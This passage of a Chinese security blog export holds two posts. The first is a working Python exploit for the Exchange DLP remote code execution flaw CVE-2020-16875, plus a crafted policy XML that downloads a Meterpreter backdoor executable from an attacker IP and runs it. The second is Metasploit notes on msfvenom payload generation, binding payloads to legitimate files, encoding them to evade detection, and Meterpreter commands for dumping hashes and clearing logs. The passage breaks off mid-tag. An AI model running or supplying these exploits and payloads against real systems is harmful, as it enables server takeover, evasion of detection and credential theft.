class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_string</span>(<span class="params">str_len=<span class="number">8</span></span>):</span></span><br><span class="line">    letters = string.ascii_lowercase</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(letters) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(str_len))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_xml</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;dlpPolicyTemplates&gt;</span></span><br><span class="line"><span class="string">  &lt;dlpPolicyTemplate id=&quot;F7C29AEC-A52D-4502-9670-141424A83FAB&quot; mode=&quot;Audit&quot; state=&quot;Enabled&quot; version=&quot;15.0.2.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;contentVersion&gt;4&lt;/contentVersion&gt;</span></span><br><span class="line"><span class="string">    &lt;publisherName&gt;si&lt;/publisherName&gt;</span></span><br><span class="line"><span class="string">    &lt;name&gt;</span></span><br><span class="line"><span class="string">      &lt;localizedString lang=&quot;en&quot;&gt;&lt;/localizedString&gt;</span></span><br><span class="line"><span class="string">    &lt;/name&gt;</span></span><br><span class="line"><span class="string">    &lt;description&gt;</span></span><br><span class="line"><span class="string">      &lt;localizedString lang=&quot;en&quot;&gt;&lt;/localizedString&gt;</span></span><br><span class="line"><span class="string">    &lt;/description&gt;</span></span><br><span class="line"><span class="string">    &lt;keywords&gt;&lt;/keywords&gt;</span></span><br><span class="line"><span class="string">    &lt;ruleParameters&gt;&lt;/ruleParameters&gt;</span></span><br><span class="line"><span class="string">    &lt;policyCommands&gt;</span></span><br><span class="line"><span class="string">      &lt;commandBlock&gt;</span></span><br><span class="line"><span class="string">        &lt;![CDATA[ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName=&quot;cmd&quot;;$i.Arguments=&quot;/c %s&quot;;$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start() ]]&gt;</span></span><br><span class="line"><span class="string">      &lt;/commandBlock&gt;</span></span><br><span class="line"><span class="string">    &lt;/policyCommands&gt;</span></span><br><span class="line"><span class="string">    &lt;policyCommandsResources&gt;&lt;/policyCommandsResources&gt;</span></span><br><span class="line"><span class="string">  &lt;/dlpPolicyTemplate&gt;</span></span><br><span class="line"><span class="string">&lt;/dlpPolicyTemplates&gt;&quot;&quot;&quot;</span> % c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_rce</span>(<span class="params">t, s, vs, cmd</span>):</span></span><br><span class="line">    f = &#123;</span><br><span class="line">        <span class="string">&#x27;__VIEWSTATE&#x27;</span>: (<span class="literal">None</span>, vs),</span><br><span class="line">        <span class="string">&#x27;ctl00$ResultPanePlaceHolder$senderBtn&#x27;</span>: (<span class="literal">None</span>, <span class="string">&quot;ResultPanePlaceHolder_ButtonsPanel_btnNext&quot;</span>),</span><br><span class="line">        <span class="string">&#x27;ctl00$ResultPanePlaceHolder$contentContainer$name&#x27;</span>: (<span class="literal">None</span>, random_string()),</span><br><span class="line">        <span class="string">&#x27;ctl00$ResultPanePlaceHolder$contentContainer$upldCtrl&#x27;</span>: (<span class="string">&quot;dlprce.xml&quot;</span>, get_xml(cmd)),</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(<span class="string">&quot;https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx&quot;</span> % t, files=f, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">assert</span> r.status_code == <span class="number">200</span>, <span class="string">&quot;(-) failed to trigger rce!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_viewstate</span>(<span class="params">t, s</span>):</span><span class="comment">#类似是做了一个爬虫，爬取网站的内容</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    r = s.get(<span class="string">&quot;https://192.168.6.143/ecp/DLPPolicy/ManagePolicyFromISV.aspx&quot;</span>, verify=<span class="literal">False</span>,headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line">    match = re.search(<span class="string">&quot;&lt;input type=\&quot;hidden\&quot; name=\&quot;__VIEWSTATE\&quot; id=\&quot;__VIEWSTATE\&quot; value=\&quot;(.*)\&quot; /&gt;&quot;</span>, r.text)<span class="comment">#做了一个正则匹配</span></span><br><span class="line">    <span class="keyword">assert</span> match != <span class="literal">None</span>, <span class="string">&quot;(-) couldn&#x27;t leak the __viewstate!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_in</span>(<span class="params">t, usr, pwd</span>):</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    d = &#123;</span><br><span class="line">        <span class="string">&quot;destination&quot;</span> : <span class="string">&quot;https://%s/owa&quot;</span> % t,</span><br><span class="line">        <span class="string">&quot;flags&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;username&quot;</span> : usr,</span><br><span class="line">        <span class="string">&quot;password&quot;</span> : pwd</span><br><span class="line">    &#125;</span><br><span class="line">    s.post(<span class="string">&quot;https://%s/owa/auth.owa&quot;</span> % t, data=d, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">assert</span> s.cookies.get(name=<span class="string">&#x27;X-OWA-CANARY&#x27;</span>) != <span class="literal">None</span>, <span class="string">&quot;(-) couldn&#x27;t leak the csrf canary!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">t, usr, pwd, cmd</span>):</span></span><br><span class="line">    s = log_in(t, usr, pwd)<span class="comment">#先用已有账号登录，用一个session对象存起来</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(+) logged in as %s&quot;</span> % usr)</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    vs = leak_viewstate(t, s)<span class="comment">#传入地址和session</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(+) found the __viewstate: %s&quot;</span> % vs)</span><br><span class="line">    trigger_rce(t, s, vs, cmd)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(+) executed %s as SYSTEM!&quot;</span> % cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(+) usage: %s &lt;target&gt; &lt;user:pass&gt; &lt;cmd&gt;&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(+) eg: %s 192.168.75.142 harrym@exchangedemo.com:user123### mspaint&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(-<span class="number">1</span>)</span><br><span class="line">    trgt = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> sys.argv[<span class="number">2</span>], <span class="string">&quot;(-) you need a user and password!&quot;</span></span><br><span class="line">    usr = sys.argv[<span class="number">2</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    pwd = sys.argv[<span class="number">2</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    cmd = sys.argv[<span class="number">3</span>]</span><br><span class="line">    main(trgt, usr, pwd, cmd)</span><br></pre></td></tr></table></figure><p>通过一个脚本，我们全自动的实现了命令执行这一流程，不再需要自行进行请求，更加方便了。</p><h3 id="三、exp的生成"><a href="#三、exp的生成" class="headerlink" title="三、exp的生成"></a>三、exp的生成</h3><p>​    上面我们已经达到了命令执行的效果，但是我们不能每次都通过命令执行的漏洞进行命令执行操作，这样不够方便，也不够稳定，因此我们选用<strong>metasploit</strong>。</p><p>​    在这里不对metasploit的使用进行赘述，可以参考<a href="https://lhl7.github.io/2022/03/26/Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/">我的另一篇博客</a>。</p><p>​    在生成了木马文件后，在kali上部署服务，将木马文件放置在var/www/html目录下，然后运行apache2服务。</p><p>这样一来，我们可以通过访问uri的方式下载木马文件，通过如下语句，即可下载并执行木马文件。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> http://<span class="number">192.168</span>.<span class="number">6.130</span>/meter_re_tcp_x86.exe <span class="literal">-OutFile</span> C:\Users\<span class="number">86183</span>\Desktop\bkdoor.exe) ; (C:\Users\<span class="number">86183</span>\Desktop\bkdoor.exe)</span><br></pre></td></tr></table></figure><p>注：此处连接符不能用 <code>-and</code>，因为<code>-and</code>连接符会导致第一句中文件还没下载结束前，第二句就已经开始执行，导致返回false。</p><p>我们将上述内容粘贴进xml文件的相应位置（如自动化执行，只需要更改输入的参数）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dlpPolicyTemplates</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dlpPolicyTemplate</span> <span class="attr">id</span>=<span class="string">&quot;F7C29AEC-A52D-4502-9670-141424A83FAB&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;Audit&quot;</span> <span class="attr">state</span>=<span class="string">&quot;Enabled&quot;</span> <span class="attr">version</span>=<span class="string">&quot;15.0.2.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">contentVersion</span>&gt;</span>4<span class="tag">&lt;/<span class="name">contentVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">publisherName</span>&gt;</span>Microsoft<span class="tag">&lt;/<span class="name">publisherName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">localizedString</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>PCI-DSS-12345<span class="tag">&lt;/<span class="name">localizedString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">localizedString</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Detects the presence of information subject to Payment Card Industry Data Security Standard (PCI-DSS) compliance requirements.<span class="tag">&lt;/<span class="name">localizedString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">keywords</span>&gt;</span><span class="tag">&lt;/<span class="name">keywords</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ruleParameters</span>&gt;</span><span class="tag">&lt;/<span class="name">ruleParameters</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">policyCommands</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- The contents below are applied/executed as rules directly in PS - --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">commandBlock</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName=&quot;cmd&quot;;$i.Arguments=&quot;/c (Invoke-WebRequest -Uri http://192.168.6.130/meter_re_tcp_x86.exe -OutFile C:\Users\86183\Desktop\bkdoor.exe) ; (C:\Users\86183\Desktop\bkdoor.exe)&quot;;$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start(); ]]&gt;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">commandBlock</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">policyCommands</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">policyCommandsResources</span>&gt;</span><span class="tag">&lt;/<span class="name">policyCommandsResources</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dlpPolicyTemplate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dlpPolicyTemplates</span>&gt;</span></span><br></pre></td></tr></table></figure><p>按照上文中的方法上传：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326202822403.png" alt="image-20220326202822403"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326203246567.png" alt="image-20220326203246567"></p><p>可以看到服务器自动下载并运行了该木马程序，我们可以后续进行持久化、进程迁移等等后续工作。</p><h2 id="0x05-参考文献"><a href="#0x05-参考文献" class="headerlink" title="0x05 参考文献"></a>0x05 参考文献</h2><p>漏洞基本信息：</p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-16875">https://nvd.nist.gov/vuln/detail/CVE-2020-16875</a></p><p>环境搭建部分：</p><p><a href="https://saucer-man.com/information_security/748.html#cl-6">https://saucer-man.com/information_security/748.html#cl-6</a></p><p>逆向思路参考：</p><p><a href="https://www.anquanke.com/post/id/219091?from=timeline#h2-1">https://www.anquanke.com/post/id/219091?from=timeline#h2-1</a></p><p>实验过程参考：</p><p><a href="https://blog.csdn.net/z136370204/article/details/109818580">https://blog.csdn.net/z136370204/article/details/109818580</a></p><p>MS官网：</p><p><a href="https://docs.microsoft.com/en-us/exchange/developing-dlp-policy-template-files-exchange-2013-help">https://docs.microsoft.com/en-us/exchange/developing-dlp-policy-template-files-exchange-2013-help</a></p><p><a href="https://docs.microsoft.com/zh-cn/powershell/module/exchange/new-dlppolicy?view=exchange-ps">https://docs.microsoft.com/zh-cn/powershell/module/exchange/new-dlppolicy?view=exchange-ps</a></p><p><a href="https://docs.microsoft.com/zh-cn/powershell/exchange/exchange-cmdlet-syntax?view=exchange-ps">https://docs.microsoft.com/zh-cn/powershell/exchange/exchange-cmdlet-syntax?view=exchange-ps</a></p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit的使用笔记</title>
      <link href="/2022/03/26/Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/03/26/Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Metasploit的使用笔记"><a href="#Metasploit的使用笔记" class="headerlink" title="Metasploit的使用笔记"></a>Metasploit的使用笔记</h1><blockquote><p><strong>Metasploit项目</strong>是一个旨在提供<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3">安全漏洞信息</a>计算机安全项目，可以协助安全工程师进行<a href="https://zh.wikipedia.org/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>（penetration testing）及<a href="https://zh.wikipedia.org/wiki/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F">入侵检测系统</a>签名开发。</p><p>Metasploit项目最为知名的子项目是<a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E6%94%BE%E6%BA%90%E4%BB%A3%E7%A0%81">开源</a>的Metasploit框架，一套针对远程主机进行开发和执行“<a href="https://zh.wikipedia.org/wiki/Exploit">exploit</a>代码”的工具。其他重要的子项目包括Opcode数据库、shellcode文件、安全研究等内容。</p><p>Metasploit项目知名的功能还包括反取证与规避工具，其中的某些工具已经内置在Metasploit Framework里面。</p></blockquote><p>摘自：维基百科<a href="https://zh.wikipedia.org/wiki/Metasploit">https://zh.wikipedia.org/wiki/Metasploit</a></p><p>msf很像是python，它是有自己的命令执行窗口的，快速打开执行窗口（-q表示快速quick）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br></pre></td></tr></table></figure><h2 id="0x01-木马文件的配置与生成"><a href="#0x01-木马文件的配置与生成" class="headerlink" title="0x01 木马文件的配置与生成"></a>0x01 木马文件的配置与生成</h2><p>此后的命令都是在<strong>msfconsole</strong>中输入的：</p><h3 id="一、配置木马："><a href="#一、配置木马：" class="headerlink" title="一、配置木马："></a>一、配置木马：</h3><p>选择模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure><p>输出当前选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220321102830032.png" alt="image-20220321102830032"></p><p>可以看到输出了我们使用的<strong>Module</strong>（现在还没选），同时还有<strong>payload options</strong>，其中显示的是监听主机的<strong>localhost</strong>和<strong>localport</strong>，此时，我们需要对其中的各个选项进行设置。</p><p>设置主机<strong>LHOST</strong>（攻击者ip）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set LHOST 192.168.119.133</span><br></pre></td></tr></table></figure><p>然后我们需要设置<strong>payload</strong>：</p><p>我们可以先通过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure><p>来展示所有payload，同时也可以随时使用tab键打印提示：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220321104545327.png" alt="image-20220321104545327"></p><p>设置<strong>payload</strong>使用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p>至此，已经全部配置完毕。</p><h3 id="二、生成木马："><a href="#二、生成木马：" class="headerlink" title="二、生成木马："></a>二、生成木马：</h3><p>打开新的命令窗口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 --platform windows -o ./meter_re_tcp_x86.exe LOHOST=192.168.6.130 LPORT=4444</span><br></pre></td></tr></table></figure><p>指定木马的内容，对应的文件格式，靶机的系统架构，还有我们监听者的IP和端口。</p><h3 id="三、开启监听："><a href="#三、开启监听：" class="headerlink" title="三、开启监听："></a>三、开启监听：</h3><p>在刚刚配置木马的<strong>msfconsole</strong>中，输入<code>run</code>或者<code>exploit</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220321110128592.png" alt="image-20220321110128592"></p><p>第一次失败了，我们可以尝试换端口，然后就成功开启监听了。</p><p>连接之后，可以通过**meterpreter&gt;**命令行控制。</p><h3 id="四、通过文件快速启动："><a href="#四、通过文件快速启动：" class="headerlink" title="四、通过文件快速启动："></a>四、通过文件快速启动：</h3><p>由于每次过程比较复杂，所以我们可以使用shell脚本和文件msf自带的读取文件执行命令的方式，更快速的完成上面的步骤：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">x86_win.sh</span></span><br><span class="line">ip=192.168.6.130</span><br><span class="line">port=4444</span><br><span class="line">arch=x86</span><br><span class="line">platform=windows</span><br><span class="line">format=exe</span><br><span class="line">payload=windows/meterpreter/reverse_tcp</span><br><span class="line">out=../Backs/meter_re_tcp_x86.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p $payload -f $format -a $arch --platform $platform -o $out LHOST=$ip LPORT=$port</span><br></pre></td></tr></table></figure><p>此文件用于生成木马文件，执行shell文件即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.6.130</span><br><span class="line">set LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>此文件用于快速开启监听，使用命令如下开启监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -r ./run_x86_mete_re</span><br></pre></td></tr></table></figure><h2 id="0x02-捆绑、混淆"><a href="#0x02-捆绑、混淆" class="headerlink" title="0x02 捆绑、混淆"></a>0x02 捆绑、混淆</h2><p>注意，这里列举的是一部分msf的功能，但并非所有，可以通过：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-h</span> 对所有的功能参数进行查询，要对某条功能如encoder进行详细查看，使用：</span><br><span class="line">msfvenom <span class="literal">-l</span> encoder 当然，这里也可以替换为其他功能（也就是查看该功能的选项）</span><br></pre></td></tr></table></figure><h3 id="一、捆绑"><a href="#一、捆绑" class="headerlink" title="一、捆绑"></a>一、捆绑</h3><p>捆绑指把木马捆绑在一个正常文件上，在执行正常文件的同时执行木马，迷惑受害者。</p><p>捆绑使用参数<code>-x </code>，后面填所要捆绑的文件的地址即可。</p><p>​    注意：这里可能会报由于没有Entery Point的错误，更换被绑定exe即可</p><h3 id="二、混淆"><a href="#二、混淆" class="headerlink" title="二、混淆"></a>二、混淆</h3><p>混淆是指对木马代码进行处理，使其更难以被识别。</p><p>混淆使用参数<code>-e &#39;混淆器名&#39;</code>（无引号），即encoder，-e后的参数可以通过命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-l</span> encoder</span><br></pre></td></tr></table></figure><p>进行查询，常用的有：<code>x86/shikata_ga_nai</code></p><p>​    </p><p>添加参数<code>-i &#39;混淆次数&#39;</code>（无引号），作为混淆次数。</p><h2 id="0x03-meterpreter"><a href="#0x03-meterpreter" class="headerlink" title="0x03 meterpreter"></a>0x03 meterpreter</h2><p>注：在下方列出了很多命令，我们要查询命令集，直接使用<code>?</code>进行查询。</p><p>在木马连接了之后，我们使用<strong>meterpreter</strong>对受害靶机进行操作，那我们能够操作的内容有哪些呢？</p><p><strong>getsystem</strong>命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem <span class="literal">-t0</span></span><br></pre></td></tr></table></figure><p>尝试所有可能的方法，获取更高权限（当然大概率是会失败的）。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220325095245215.png" alt="image-20220325095245215"></p><p>但是这里如果我们真的成功获得了权限，可以使用命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/hashdump</span><br></pre></td></tr></table></figure><p>得到系统管理员密码的哈希，然后用其他方式进行爆破即可。</p><h3 id="一、文件操作"><a href="#一、文件操作" class="headerlink" title="一、文件操作"></a>一、文件操作</h3><p>​    以下命令操作与linux类似，如不知道应该如何使用，可以直接在<strong>meterpreter</strong>命令行，输入该操作名，或者一般是操作名 <code>-h</code>就会出现相关帮助。</p><p><strong>cat</strong>：Read the contents of a file to the screen<br><strong>cd</strong>：Change directory<br><strong>checksum</strong>：Retrieve the checksum of a file<br><strong>cp</strong>：Copy source to destination<br><strong>del</strong>：Delete the specified file<br><strong>dir</strong>：List files (alias for Is)<br><strong>download</strong>：Download a file or directory<br><strong>edit</strong>：Edit a file<br><strong>getlwd</strong>：Print local working directory<br><strong>getwd</strong>：Print working directory<br><strong>Icd</strong>：Change local working directory<br><strong>lls</strong>：List local files<br><strong>Ipwd</strong>：Print local working directory<br><strong>Is</strong>：List files<br><strong>mkdir</strong>：Make directory<br><strong>mv</strong>：Move source to destination<br><strong>pwd</strong>：Print working directory<br><strong>rm</strong>：Delete the specified file<br><strong>rmdir</strong>：Remove directory<br><strong>search</strong>：Search for files<br><strong>show_ mount</strong>： List all mount points/logical drlves<br><strong>upload</strong>：Upload a fle or directory</p><h3 id="二、系统操作"><a href="#二、系统操作" class="headerlink" title="二、系统操作"></a>二、系统操作</h3><p><strong>clearev</strong>：Clear the event log<br><strong>drop_ token</strong>： Relinquishes any active impersonation token.<br><strong>execute</strong>：Execute a command<br><strong>getenv</strong>：Get one or more environment variable values<br><strong>getpid</strong>：Get the current process identifier<br><strong>getprivs</strong>：Attempt to enable all privileges available to the current process<br><strong>getsid</strong>：Get the SID of the user that the server is running as<br><strong>getuid</strong>：Get the user that the server is running as<br><strong>kill</strong>：Terminate a process<br><strong>localtime：</strong>Displays the target system local date and time<br><strong>pgrep</strong>：Filter processes by name<br><strong>pkill</strong>：Terminate processes by name<br><strong>ps</strong>：List running processes<br><strong>reboot：</strong>Reboots the remote computer<br><strong>reg</strong>：Modify and interact with the remote registry<br><strong>rev2self</strong>：Calls RevertToSelf() on the remote machine（降低权限）<br><strong>shell</strong>：Drop into a system command shell（进入反弹shell）<br><strong>shutdown</strong>：Shuts down the remote computer<br><strong>steal_ token</strong>： Attempts to steal an impersonation token from the target process<br><strong>suspend</strong>：Suspends(挂起) or resumes a list of processes<br><strong>sysinfo</strong>：Gets information about the remote system, such as OS</p><h3 id="三、网络操作"><a href="#三、网络操作" class="headerlink" title="三、网络操作"></a>三、网络操作</h3><p><strong>arp</strong>：Display the host ARP cache<br><strong>getproxy</strong>：Display the current proxy configuration<br><strong>ifconfig</strong>：Display interfaces<br><strong>ipconfig</strong>：Display interfaces<br><strong>netstat：</strong>Display the network connections<br><strong>portfwd</strong>：Forward a local port to a remote service<br><strong>resolve：</strong>Resolve a set of host names on the target<br><strong>route</strong>：View and modify the routing table</p><p>在这里，还需要提出一个重要的概念：</p><h4 id="端口转发："><a href="#端口转发：" class="headerlink" title="端口转发："></a>端口转发：</h4><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220325104616631.png" alt="image-20220325104616631" style="zoom:67%;" /><p>我们在kali上的<strong>meterpreter</strong>中使用命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add <span 